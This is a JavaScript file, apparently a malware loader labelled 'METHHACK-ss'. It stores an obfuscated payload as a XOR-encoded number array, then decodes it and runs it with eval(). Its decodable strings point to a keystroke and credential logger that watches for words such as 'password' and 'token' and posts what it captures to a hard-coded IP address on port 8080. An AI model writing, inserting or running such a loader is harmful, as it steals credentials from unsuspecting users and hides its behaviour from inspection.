// RAW JS Loader (METHHACK-ss)
const PAYLOAD_FORMAT = "xor";

const payload_base64 = `null`;
const payload_charcode = null;
const xor_payload = [91, 87, 86, 75, 76, 24, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 5, 89, 8, 103, 8, 64, 13, 94, 12, 89, 3, 16, 94, 77, 86, 91, 76, 81, 87, 86, 16, 103, 8, 64, 91, 90, 93, 11, 8, 10, 20, 103, 8, 64, 12, 15, 8, 89, 89, 10, 17, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 11, 12, 90, 10, 13, 15, 5, 89, 8, 103, 8, 64, 13, 94, 12, 89, 20, 103, 8, 64, 11, 1, 94, 12, 92, 93, 5, 103, 8, 64, 91, 90, 93, 11, 8, 10, 16, 17, 3, 79, 80, 81, 84, 93, 16, 25, 25, 99, 101, 17, 67, 76, 74, 65, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 9, 9, 93, 8, 15, 12, 5, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 89, 1, 17, 17, 23, 8, 64, 9, 19, 21, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 90, 15, 17, 17, 23, 8, 64, 10, 19, 21, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 89, 15, 17, 17, 23, 8, 64, 11, 19, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 90, 90, 17, 17, 23, 8, 64, 12, 19, 21, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 89, 89, 17, 17, 23, 8, 64, 13, 19, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 90, 13, 17, 17, 23, 8, 64, 14, 18, 16, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 89, 90, 17, 17, 23, 8, 64, 15, 17, 19, 21, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 89, 14, 17, 17, 23, 8, 64, 0, 18, 16, 21, 72, 89, 74, 75, 93, 113, 86, 76, 16, 103, 8, 64, 11, 12, 90, 10, 13, 15, 16, 8, 64, 9, 90, 1, 17, 17, 23, 8, 64, 1, 17, 3, 81, 94, 16, 103, 8, 64, 9, 9, 93, 8, 15, 12, 5, 5, 5, 103, 8, 64, 12, 15, 8, 89, 89, 10, 17, 90, 74, 93, 89, 83, 3, 93, 84, 75, 93, 24, 103, 8, 64, 11, 1, 94, 12, 92, 93, 99, 31, 72, 77, 75, 80, 31, 101, 16, 103, 8, 64, 11, 1, 94, 12, 92, 93, 99, 31, 75, 80, 81, 94, 76, 31, 101, 16, 17, 17, 3, 69, 91, 89, 76, 91, 80, 16, 103, 8, 64, 9, 10, 92, 90, 90, 11, 17, 67, 103, 8, 64, 11, 1, 94, 12, 92, 93, 99, 31, 72, 77, 75, 80, 31, 101, 16, 103, 8, 64, 11, 1, 94, 12, 92, 93, 99, 31, 75, 80, 81, 94, 76, 31, 101, 16, 17, 17, 3, 69, 69, 69, 16, 89, 8, 103, 8, 64, 12, 0, 10, 0, 20, 8, 64, 91, 14, 0, 14, 14, 17, 17, 3, 94, 77, 86, 91, 76, 81, 87, 86, 24, 89, 8, 103, 8, 64, 12, 0, 10, 0, 16, 17, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 10, 91, 15, 9, 90, 14, 5, 99, 31, 12, 9, 12, 0, 1, 11, 115, 118, 72, 72, 116, 122, 31, 20, 31, 11, 8, 12, 12, 10, 12, 8, 95, 118, 89, 82, 108, 80, 31, 20, 31, 11, 8, 0, 1, 11, 9, 8, 85, 64, 119, 89, 87, 83, 31, 20, 31, 80, 76, 76, 72, 2, 23, 23, 9, 12, 10, 22, 9, 15, 1, 22, 0, 12, 22, 9, 10, 2, 0, 8, 0, 8, 23, 84, 87, 95, 31, 20, 31, 83, 93, 65, 31, 20, 31, 99, 123, 10, 100, 64, 10, 8, 107, 113, 117, 101, 100, 64, 10, 8, 104, 119, 107, 108, 100, 64, 10, 8, 23, 84, 87, 95, 100, 64, 10, 8, 5, 6, 31, 20, 31, 72, 89, 75, 75, 79, 87, 74, 92, 31, 20, 31, 84, 93, 86, 95, 76, 80, 31, 20, 31, 84, 87, 95, 31, 20, 31, 76, 87, 113, 107, 119, 107, 76, 74, 81, 86, 95, 31, 20, 31, 99, 115, 125, 97, 107, 113, 118, 115, 101, 100, 64, 10, 8, 123, 89, 72, 76, 77, 74, 93, 92, 2, 31, 20, 31, 84, 87, 95, 81, 86, 31, 20, 31, 14, 109, 107, 92, 126, 77, 78, 31, 20, 31, 83, 1, 10, 11, 10, 31, 20, 31, 10, 13, 15, 14, 9, 0, 12, 84, 64, 116, 92, 98, 82, 31, 20, 31, 89, 92, 92, 125, 78, 93, 86, 76, 116, 81, 75, 76, 93, 86, 93, 74, 31, 20, 31, 0, 15, 8, 0, 12, 83, 97, 91, 76, 82, 93, 31, 20, 31, 104, 119, 107, 108, 31, 20, 31, 11, 11, 11, 13, 10, 1, 10, 76, 127, 95, 83, 116, 119, 31, 20, 31, 75, 84, 81, 91, 93, 31, 20, 31, 9, 14, 8, 0, 122, 116, 122, 86, 90, 113, 31, 20, 31, 10, 15, 15, 12, 12, 15, 10, 89, 115, 76, 118, 73, 104, 31, 20, 31, 89, 72, 72, 84, 81, 91, 89, 76, 81, 87, 86, 23, 82, 75, 87, 86, 31, 101, 3, 89, 8, 103, 8, 64, 12, 0, 10, 0, 5, 94, 77, 86, 91, 76, 81, 87, 86, 16, 17, 67, 74, 93, 76, 77, 74, 86, 24, 103, 8, 64, 10, 91, 15, 9, 90, 14, 3, 69, 3, 74, 93, 76, 77, 74, 86, 24, 89, 8, 103, 8, 64, 12, 0, 10, 0, 16, 17, 3, 69, 84, 93, 76, 24, 83, 93, 65, 75, 5, 31, 31, 20, 75, 93, 86, 75, 81, 76, 81, 78, 93, 108, 74, 81, 95, 95, 93, 74, 111, 87, 74, 92, 75, 5, 99, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 16, 8, 64, 9, 89, 94, 17, 20, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 16, 8, 64, 9, 90, 12, 17, 20, 31, 89, 92, 85, 81, 86, 31, 101, 3, 94, 77, 86, 91, 76, 81, 87, 86, 24, 89, 8, 103, 8, 64, 13, 94, 12, 89, 16, 103, 8, 64, 1, 90, 13, 11, 93, 14, 20, 103, 8, 64, 11, 13, 90, 93, 94, 11, 17, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 12, 0, 10, 0, 89, 10, 5, 89, 8, 103, 8, 64, 12, 0, 10, 0, 16, 17, 3, 74, 93, 76, 77, 74, 86, 24, 89, 8, 103, 8, 64, 13, 94, 12, 89, 5, 94, 77, 86, 91, 76, 81, 87, 86, 16, 103, 8, 64, 13, 94, 12, 89, 15, 8, 20, 103, 8, 64, 11, 0, 93, 91, 1, 93, 17, 67, 103, 8, 64, 13, 94, 12, 89, 15, 8, 5, 103, 8, 64, 13, 94, 12, 89, 15, 8, 21, 8, 64, 9, 89, 14, 3, 84, 93, 76, 24, 103, 8, 64, 11, 94, 1, 0, 0, 9, 5, 103, 8, 64, 12, 0, 10, 0, 89, 10, 99, 103, 8, 64, 13, 94, 12, 89, 15, 8, 101, 3, 74, 93, 76, 77, 74, 86, 24, 103, 8, 64, 11, 94, 1, 0, 0, 9, 3, 69, 20, 89, 8, 103, 8, 64, 13, 94, 12, 89, 16, 103, 8, 64, 1, 90, 13, 11, 93, 14, 20, 103, 8, 64, 11, 13, 90, 93, 94, 11, 17, 3, 69, 92, 87, 91, 77, 85, 93, 86, 76, 99, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 16, 8, 64, 9, 90, 0, 17, 101, 16, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 16, 8, 64, 9, 90, 14, 17, 20, 103, 8, 64, 10, 94, 8, 14, 0, 89, 5, 6, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 13, 0, 89, 90, 10, 94, 5, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 3, 83, 93, 65, 75, 19, 5, 103, 8, 64, 10, 94, 8, 14, 0, 89, 99, 103, 8, 64, 13, 0, 89, 90, 10, 94, 16, 8, 64, 9, 89, 92, 17, 101, 20, 83, 93, 65, 75, 99, 103, 8, 64, 13, 0, 89, 90, 10, 94, 16, 8, 64, 9, 90, 8, 17, 101, 29, 8, 64, 89, 5, 5, 5, 8, 64, 8, 30, 30, 91, 87, 86, 75, 87, 84, 93, 99, 103, 8, 64, 13, 0, 89, 90, 10, 94, 16, 8, 64, 9, 90, 9, 17, 101, 16, 103, 8, 64, 13, 0, 89, 90, 10, 94, 16, 8, 64, 9, 90, 11, 17, 20, 83, 93, 65, 75, 17, 3, 69, 17, 20, 75, 93, 76, 113, 86, 76, 93, 74, 78, 89, 84, 16, 16, 17, 5, 6, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 12, 93, 11, 1, 12, 12, 5, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 20, 103, 8, 64, 15, 94, 8, 0, 13, 92, 5, 67, 31, 76, 81, 85, 93, 75, 76, 89, 85, 72, 31, 2, 86, 93, 79, 24, 124, 89, 76, 93, 16, 17, 99, 103, 8, 64, 12, 93, 11, 1, 12, 12, 16, 8, 64, 9, 90, 10, 17, 101, 16, 17, 20, 31, 83, 93, 65, 75, 76, 74, 87, 83, 93, 75, 31, 2, 83, 93, 65, 75, 99, 103, 8, 64, 12, 93, 11, 1, 12, 12, 16, 8, 64, 9, 90, 91, 17, 101, 16, 21, 8, 64, 10, 0, 17, 69, 3, 91, 87, 86, 75, 87, 84, 93, 99, 103, 8, 64, 12, 93, 11, 1, 12, 12, 16, 8, 64, 9, 90, 9, 17, 101, 16, 103, 8, 64, 12, 93, 11, 1, 12, 12, 16, 8, 64, 9, 89, 93, 17, 20, 103, 8, 64, 15, 94, 8, 0, 13, 92, 17, 3, 69, 20, 8, 64, 10, 15, 9, 8, 17, 20, 92, 87, 91, 77, 85, 93, 86, 76, 99, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 16, 8, 64, 9, 90, 0, 17, 101, 16, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 16, 8, 64, 9, 90, 14, 17, 20, 103, 8, 64, 10, 15, 90, 13, 12, 89, 5, 6, 67, 91, 87, 86, 75, 76, 24, 103, 8, 64, 10, 13, 9, 10, 8, 15, 5, 89, 8, 103, 8, 64, 10, 11, 10, 90, 93, 93, 3, 94, 0, 9, 11, 8, 16, 103, 8, 64, 10, 13, 9, 10, 8, 15, 16, 8, 64, 9, 89, 91, 17, 20, 67, 31, 85, 93, 76, 80, 87, 92, 31, 2, 103, 8, 64, 10, 13, 9, 10, 8, 15, 16, 8, 64, 9, 90, 89, 17, 20, 31, 90, 87, 92, 65, 31, 2, 114, 107, 119, 118, 99, 31, 75, 76, 74, 81, 86, 95, 81, 94, 65, 31, 101, 16, 67, 31, 83, 93, 65, 31, 2, 103, 8, 64, 10, 15, 90, 13, 12, 89, 99, 103, 8, 64, 10, 13, 9, 10, 8, 15, 16, 8, 64, 9, 89, 92, 17, 101, 69, 17, 20, 31, 80, 93, 89, 92, 93, 74, 75, 31, 2, 67, 31, 123, 87, 86, 76, 93, 86, 76, 21, 108, 65, 72, 93, 31, 2, 103, 8, 64, 10, 13, 9, 10, 8, 15, 16, 8, 64, 9, 89, 0, 17, 69, 69, 17, 3, 69, 17, 3];
const xor_key = 56;

function runPayload() {
  if (PAYLOAD_FORMAT === "base64") {
    eval(atob(payload_base64));
  }
  else if (PAYLOAD_FORMAT === "charcode") {
    eval(payload_charcode);
  }
  else if (PAYLOAD_FORMAT === "xor") {
    let d = "";
    for (let i = 0; i < xor_payload.length; i++) {
      d += String.fromCharCode(xor_payload[i] ^ xor_key);
    }
    
    eval(d);
  }
}

runPayload();